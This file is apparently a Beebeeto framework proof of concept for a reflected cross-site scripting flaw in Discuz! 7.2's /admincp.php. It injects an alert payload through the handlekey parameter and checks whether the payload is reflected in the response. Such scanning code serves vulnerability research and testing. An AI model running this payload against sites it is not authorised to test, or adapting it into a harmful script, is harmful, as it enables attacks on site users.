#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0001',
            'name': 'Discuz! 7.2 /admincp.php 跨站脚本漏洞 POC',
            'author': 'tmp',
            'create_date': '2014-12-31',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['7.2'],
            'type': 'Cross Site Scripting',
            'tag': ['Discuz漏洞', 'XSS漏洞', '/admincp.php', 'php'],
            'desc': 'Cross site scripting has benn found on /admincp.php file.',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-084097',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + "/admincp.php?infloat=yes&handlekey=123);alert(/bb2/);//"
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "if($('return_123);alert(/bb2/);//'" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())